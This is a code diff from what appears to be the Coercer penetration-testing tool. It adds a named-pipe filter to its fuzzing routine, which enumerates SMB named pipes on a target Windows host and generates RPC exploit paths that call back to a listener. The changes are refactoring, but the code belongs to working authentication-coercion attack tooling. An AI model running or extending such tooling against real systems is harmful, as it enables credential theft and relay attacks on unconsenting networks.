@@ -6,7 +6,7 @@
 
 
 import time
-from coercer.core.MethodFilter import MethodFilter
+from coercer.core.Filter import Filter
 from coercer.core.utils import generate_exploit_templates, generate_exploit_path_from_template
 from coercer.network.DCERPCSession import DCERPCSession
 from coercer.structures.TestResult import TestResult
@@ -16,9 +16,10 @@ from coercer.network.utils import get_ip_addr_to_listen_on, get_next_http_listen
 
 
 def action_fuzz(target, available_methods, options, credentials, reporter):
-    method_filter = MethodFilter(
+    filter = Filter(
         filter_method_name=options.filter_method_name,
-        filter_protocol_name=options.filter_protocol_name
+        filter_protocol_name=options.filter_protocol_name,
+        filter_pipe_name=options.filter_pipe_name
     )
 
     http_listen_port = 0
@@ -48,9 +49,25 @@ def action_fuzz(target, available_methods, options, credentials, reporter):
             r'\PIPE\W32TIME_ALT',
             r'\PIPE\wkssvc'
         ]
-        # \PIPE\Winsock2\CatalogChangeListener-71c-0
+        if options.verbose:
+            print("[debug] Using integrated list of %d SMB named pipes." % len(named_pipe_of_remote_machine))
     else:
         named_pipe_of_remote_machine = list_remote_pipes(target, credentials)
+        if options.verbose:
+            print("[debug] Found %d SMB named pipes on the remote machine." % len(named_pipe_of_remote_machine))
+
+    kept_pipes_after_filters = []
+    for pipe in named_pipe_of_remote_machine:
+        if filter.pipe_matches_filter(pipe):
+            kept_pipes_after_filters.append(pipe)
+    if len(kept_pipes_after_filters) == 0 and not credentials.is_anonymous():
+        print("[!] No SMB named pipes matching filter --filter-pipe-name '%s' were found on the remote machine." % options.filter_pipe_name)
+        return None
+    elif len(kept_pipes_after_filters) == 0 and credentials.is_anonymous():
+        print("[!] No SMB named pipes matching filter --filter-pipe-name '%s' were found in the list of known named pipes." % options.filter_pipe_name)
+        return None
+    else:
+        named_pipe_of_remote_machine = kept_pipes_after_filters
 
     # Preparing tasks ==============================================================================================================
 
@@ -60,7 +77,7 @@ def action_fuzz(target, available_methods, options, credentials, reporter):
             for method in sorted(available_methods[method_type][category].keys()):
                 instance = available_methods[method_type][category][method]["class"]
 
-                if method_filter.matches_filter(instance):
+                if filter.method_matches_filter(instance):
                     for access_type, access_methods in instance.access.items():
                         if access_type not in tasks.keys():
                             tasks[access_type] = {}
@@ -69,6 +86,7 @@ def action_fuzz(target, available_methods, options, credentials, reporter):
                         if access_type == "ncan_np":
                             for access_method in access_methods:
                                 namedpipe, uuid, version = access_method["namedpipe"], access_method["uuid"], access_method["version"]
+                                # if filter.pipe_matches_filter(namedpipe):
                                 if uuid not in tasks[access_type].keys():
                                     tasks[access_type][uuid] = {}
 
@@ -108,6 +126,7 @@ def action_fuzz(target, available_methods, options, credentials, reporter):
                                     continue
                                 if listener_type == "http":
                                     http_listen_port = get_next_http_listener_port(current_value=http_listen_port, listen_ip=listening_ip, options=options)
+
                                 exploitpath = generate_exploit_path_from_template(
                                     template=exploitpath,
                                     listener=listening_ip,
